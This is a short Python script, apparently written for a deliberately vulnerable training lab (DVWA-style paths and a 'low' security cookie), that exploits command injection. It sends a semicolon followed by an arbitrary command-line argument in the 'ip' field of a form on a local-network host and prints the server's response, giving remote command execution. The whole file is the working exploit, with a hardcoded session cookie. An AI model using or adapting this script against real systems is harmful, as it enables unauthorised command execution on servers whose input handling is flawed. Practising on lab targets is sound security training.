import requests
import sys

url = 'http://192.168.56.103/vulnerabilities/exec/'
stuff = {
        'ip':f';{sys.argv[1]}',
        'submit':'submit'
}

cookies = {'PHPSESSID':'trdtrei248nhd08l4o5hqnspk3','security':'low'}


x = requests.post(url, data = stuff, cookies = cookies)

print (x.text)